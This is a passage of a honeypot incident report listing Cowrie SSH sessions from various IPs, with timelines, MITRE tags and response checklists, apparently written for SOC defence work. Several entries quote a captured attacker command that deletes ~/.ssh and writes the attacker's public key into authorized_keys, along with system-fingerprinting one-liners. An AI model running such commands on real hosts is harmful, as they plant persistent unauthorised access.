| `2026-08-16 11:46:23` | `cowrie.login.success` |
| `2026-08-16 11:46:24` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.46.77[.]2` to AbuseIPDB if not already reported
- [ ] Block `111.46.77[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58450b7fba1d

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 11:46 |
| **Last Seen** | 2026-08-16 11:47 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:46:26` | `cowrie.session.connect` |
| `2026-08-16 11:46:33` | `cowrie.client.version` |
| `2026-08-16 11:46:33` | `cowrie.client.kex` |
| `2026-08-16 11:46:55` | `cowrie.login.success` |
| `2026-08-16 11:47:08` | `cowrie.session.params` |
| `2026-08-16 11:47:08` | `cowrie.command.input` |
| `2026-08-16 11:47:13` | `cowrie.log.closed` |
| `2026-08-16 11:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cefcedc720d9

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-08-16 11:46 |
| **Last Seen** | 2026-08-16 11:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:46:29` | `cowrie.session.connect` |
| `2026-08-16 11:46:29` | `cowrie.client.version` |
| `2026-08-16 11:46:29` | `cowrie.client.kex` |
| `2026-08-16 11:46:31` | `cowrie.login.success` |
| `2026-08-16 11:46:31` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-469d94fe6525

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:46 |
| **Last Seen** | 2026-08-16 11:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:46:37` | `cowrie.session.connect` |
| `2026-08-16 11:46:38` | `cowrie.client.version` |
| `2026-08-16 11:46:38` | `cowrie.client.kex` |
| `2026-08-16 11:46:38` | `cowrie.login.success` |
| `2026-08-16 11:46:40` | `cowrie.session.params` |
| `2026-08-16 11:46:40` | `cowrie.command.input` |
| `2026-08-16 11:46:40` | `cowrie.command.input` |
| `2026-08-16 11:46:40` | `cowrie.command.input` |
| `2026-08-16 11:46:40` | `cowrie.command.input` |
| `2026-08-16 11:46:40` | `cowrie.command.input` |
| `2026-08-16 11:46:40` | `cowrie.command.success` |
| `2026-08-16 11:46:40` | `cowrie.command.input` |
| `2026-08-16 11:46:40` | `cowrie.command.input` |
| `2026-08-16 11:46:40` | `cowrie.command.input` |
| `2026-08-16 11:46:40` | `cowrie.command.input` |
| `2026-08-16 11:46:40` | `cowrie.log.closed` |
| `2026-08-16 11:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a97c35a9fdc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:48 |
| **Last Seen** | 2026-08-16 11:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:48:14` | `cowrie.session.connect` |
| `2026-08-16 11:48:14` | `cowrie.client.version` |
| `2026-08-16 11:48:14` | `cowrie.client.kex` |
| `2026-08-16 11:48:15` | `cowrie.login.success` |
| `2026-08-16 11:48:16` | `cowrie.session.params` |
| `2026-08-16 11:48:16` | `cowrie.command.input` |
| `2026-08-16 11:48:16` | `cowrie.command.input` |
| `2026-08-16 11:48:16` | `cowrie.command.input` |
| `2026-08-16 11:48:16` | `cowrie.command.input` |
| `2026-08-16 11:48:16` | `cowrie.command.input` |
| `2026-08-16 11:48:16` | `cowrie.command.success` |
| `2026-08-16 11:48:16` | `cowrie.command.input` |
| `2026-08-16 11:48:16` | `cowrie.command.input` |
| `2026-08-16 11:48:16` | `cowrie.command.input` |
| `2026-08-16 11:48:16` | `cowrie.command.input` |
| `2026-08-16 11:48:16` | `cowrie.log.closed` |
| `2026-08-16 11:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71783d321bb6

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 11:48 |
| **Last Seen** | 2026-08-16 11:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:48:23` | `cowrie.session.connect` |
| `2026-08-16 11:48:23` | `cowrie.client.version` |
| `2026-08-16 11:48:23` | `cowrie.client.kex` |
| `2026-08-16 11:48:24` | `cowrie.login.success` |
| `2026-08-16 11:48:25` | `cowrie.session.params` |
| `2026-08-16 11:48:25` | `cowrie.command.input` |
| `2026-08-16 11:48:25` | `cowrie.log.closed` |
| `2026-08-16 11:48:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-732043a2f5fa

| Field | Detail |
|---|---|
| **Source IP** | `68.183.244[.]58` |
| **First Seen** | 2026-08-16 11:49 |
| **Last Seen** | 2026-08-16 11:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:49:10` | `cowrie.session.connect` |
| `2026-08-16 11:49:10` | `cowrie.client.version` |
| `2026-08-16 11:49:10` | `cowrie.client.kex` |
| `2026-08-16 11:49:11` | `cowrie.login.success` |
| `2026-08-16 11:49:13` | `cowrie.session.params` |
| `2026-08-16 11:49:13` | `cowrie.command.input` |
| `2026-08-16 11:49:13` | `cowrie.command.failed` |
| `2026-08-16 11:49:13` | `cowrie.log.closed` |
| `2026-08-16 11:49:14` | `cowrie.session.params` |
| `2026-08-16 11:49:14` | `cowrie.command.input` |
| `2026-08-16 11:49:14` | `cowrie.session.file_download` |
| `2026-08-16 11:49:14` | `cowrie.log.closed` |
| `2026-08-16 11:49:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.244[.]58` to AbuseIPDB if not already reported
- [ ] Block `68.183.244[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8228447199a3

| Field | Detail |
|---|---|
| **Source IP** | `68.183.244[.]58` |
| **First Seen** | 2026-08-16 11:49 |
| **Last Seen** | 2026-08-16 11:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:49:15` | `cowrie.session.connect` |
| `2026-08-16 11:49:15` | `cowrie.client.version` |
| `2026-08-16 11:49:15` | `cowrie.client.kex` |
| `2026-08-16 11:49:16` | `cowrie.login.success` |
| `2026-08-16 11:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.244[.]58` to AbuseIPDB if not already reported
- [ ] Block `68.183.244[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28f66f44ae2d

| Field | Detail |
|---|---|
| **Source IP** | `68.183.244[.]58` |
| **First Seen** | 2026-08-16 11:49 |
| **Last Seen** | 2026-08-16 11:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:49:16` | `cowrie.session.connect` |
| `2026-08-16 11:49:16` | `cowrie.client.version` |
| `2026-08-16 11:49:17` | `cowrie.client.kex` |
| `2026-08-16 11:49:18` | `cowrie.login.success` |
| `2026-08-16 11:49:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.244[.]58` to AbuseIPDB if not already reported
- [ ] Block `68.183.244[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5957a2bdd9be

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:49 |
| **Last Seen** | 2026-08-16 11:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:49:55` | `cowrie.session.connect` |
| `2026-08-16 11:49:55` | `cowrie.client.version` |
| `2026-08-16 11:49:55` | `cowrie.client.kex` |
| `2026-08-16 11:49:56` | `cowrie.login.success` |
| `2026-08-16 11:49:57` | `cowrie.session.params` |
| `2026-08-16 11:49:57` | `cowrie.command.input` |
| `2026-08-16 11:49:57` | `cowrie.command.input` |
| `2026-08-16 11:49:57` | `cowrie.command.input` |
| `2026-08-16 11:49:57` | `cowrie.command.input` |
| `2026-08-16 11:49:57` | `cowrie.command.input` |
| `2026-08-16 11:49:57` | `cowrie.command.success` |
| `2026-08-16 11:49:57` | `cowrie.command.input` |
| `2026-08-16 11:49:57` | `cowrie.command.input` |
| `2026-08-16 11:49:57` | `cowrie.command.input` |
| `2026-08-16 11:49:57` | `cowrie.command.input` |
| `2026-08-16 11:49:57` | `cowrie.log.closed` |
| `2026-08-16 11:49:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05e975c36b30

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-08-16 11:50 |
| **Last Seen** | 2026-08-16 11:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:50:30` | `cowrie.session.connect` |
| `2026-08-16 11:50:30` | `cowrie.client.version` |
| `2026-08-16 11:50:30` | `cowrie.client.kex` |
| `2026-08-16 11:50:31` | `cowrie.login.success` |
| `2026-08-16 11:50:32` | `cowrie.session.params` |
| `2026-08-16 11:50:32` | `cowrie.command.input` |
| `2026-08-16 11:50:32` | `cowrie.command.failed` |
| `2026-08-16 11:50:33` | `cowrie.log.closed` |
| `2026-08-16 11:50:34` | `cowrie.session.params` |
| `2026-08-16 11:50:34` | `cowrie.command.input` |
| `2026-08-16 11:50:34` | `cowrie.session.file_download` |
| `2026-08-16 11:50:34` | `cowrie.log.closed` |
| `2026-08-16 11:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b542f02b451d

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-08-16 11:50 |
| **Last Seen** | 2026-08-16 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:50:34` | `cowrie.session.connect` |
| `2026-08-16 11:50:34` | `cowrie.client.version` |
| `2026-08-16 11:50:34` | `cowrie.client.kex` |
| `2026-08-16 11:50:35` | `cowrie.login.success` |
| `2026-08-16 11:50:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dabff77ac9f8

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-08-16 11:50 |
| **Last Seen** | 2026-08-16 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:50:36` | `cowrie.session.connect` |
| `2026-08-16 11:50:36` | `cowrie.client.version` |
| `2026-08-16 11:50:36` | `cowrie.client.kex` |
| `2026-08-16 11:50:37` | `cowrie.login.success` |
| `2026-08-16 11:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d7d6f16cdcf

| Field | Detail |
|---|---|
| **Source IP** | `182.42.113[.]10` |
| **First Seen** | 2026-08-16 11:54 |
| **Last Seen** | 2026-08-16 11:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:54:23` | `cowrie.session.connect` |
| `2026-08-16 11:54:24` | `cowrie.client.version` |
| `2026-08-16 11:54:24` | `cowrie.client.kex` |
| `2026-08-16 11:54:26` | `cowrie.login.success` |
| `2026-08-16 11:54:27` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.42.113[.]10` to AbuseIPDB if not already reported
- [ ] Block `182.42.113[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59882f9ff997

| Field | Detail |
|---|---|
| **Source IP** | `220.246.66[.]209` |
| **First Seen** | 2026-08-16 11:54 |
| **Last Seen** | 2026-08-16 11:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:54:33` | `cowrie.session.connect` |
| `2026-08-16 11:54:34` | `cowrie.client.version` |
| `2026-08-16 11:54:34` | `cowrie.client.kex` |
| `2026-08-16 11:54:36` | `cowrie.login.success` |
| `2026-08-16 11:54:37` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.66[.]209` to AbuseIPDB if not already reported
- [ ] Block `220.246.66[.]209` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faa3e2f00531

| Field | Detail |
|---|---|
| **Source IP** | `220.132.170[.]64` |
| **First Seen** | 2026-08-16 11:54 |
| **Last Seen** | 2026-08-16 11:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:54:36` | `cowrie.session.connect` |
| `2026-08-16 11:54:37` | `cowrie.client.version` |
| `2026-08-16 11:54:37` | `cowrie.client.kex` |
| `2026-08-16 11:54:39` | `cowrie.login.success` |
| `2026-08-16 11:54:40` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.132.170[.]64` to AbuseIPDB if not already reported
- [ ] Block `220.132.170[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d371e8066ee

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-08-16 11:54 |
| **Last Seen** | 2026-08-16 11:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:54:46` | `cowrie.session.connect` |
| `2026-08-16 11:54:46` | `cowrie.client.version` |
| `2026-08-16 11:54:46` | `cowrie.client.kex` |
| `2026-08-16 11:54:48` | `cowrie.login.success` |
| `2026-08-16 11:54:49` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fdca3c5b3d5

| Field | Detail |
|---|---|
| **Source IP** | `185.246.255[.]183` |
| **First Seen** | 2026-08-16 12:05 |
| **Last Seen** | 2026-08-16 12:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:05:43` | `cowrie.session.connect` |
| `2026-08-16 12:05:44` | `cowrie.client.version` |
| `2026-08-16 12:05:44` | `cowrie.client.kex` |
| `2026-08-16 12:05:45` | `cowrie.login.success` |
| `2026-08-16 12:05:46` | `cowrie.direct-tcpip.request` |
| `2026-08-16 12:05:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.246.255[.]183` to AbuseIPDB if not already reported
- [ ] Block `185.246.255[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8066629b6d62

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 12:07 |
| **Last Seen** | 2026-08-16 12:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:07:30` | `cowrie.session.connect` |
| `2026-08-16 12:07:30` | `cowrie.client.version` |
| `2026-08-16 12:07:30` | `cowrie.client.kex` |
| `2026-08-16 12:07:31` | `cowrie.login.success` |
| `2026-08-16 12:07:32` | `cowrie.session.params` |
| `2026-08-16 12:07:32` | `cowrie.command.input` |
| `2026-08-16 12:07:32` | `cowrie.log.closed` |
| `2026-08-16 12:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70d8529a1cec

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 12:09 |
| **Last Seen** | 2026-08-16 12:10 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:09:23` | `cowrie.session.connect` |
| `2026-08-16 12:09:29` | `cowrie.client.version` |
| `2026-08-16 12:09:29` | `cowrie.client.kex` |
| `2026-08-16 12:09:52` | `cowrie.login.success` |
| `2026-08-16 12:10:04` | `cowrie.session.params` |
| `2026-08-16 12:10:04` | `cowrie.command.input` |
| `2026-08-16 12:10:09` | `cowrie.log.closed` |
| `2026-08-16 12:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-218b07f0083f

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]72` |
| **First Seen** | 2026-08-16 12:20 |
| **Last Seen** | 2026-08-16 12:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 12:20:12` | `cowrie.session.connect` |
| `2026-08-16 12:20:13` | `cowrie.client.version` |
| `2026-08-16 12:20:13` | `cowrie.client.kex` |
| `2026-08-16 12:20:15` | `cowrie.login.success` |
| `2026-08-16 12:20:16` | `cowrie.direct-tcpip.request` |
| `2026-08-16 12:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]72` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49c2e1e4ceb2

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-08-16 12:23 |
| **Last Seen** | 2026-08-16 12:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
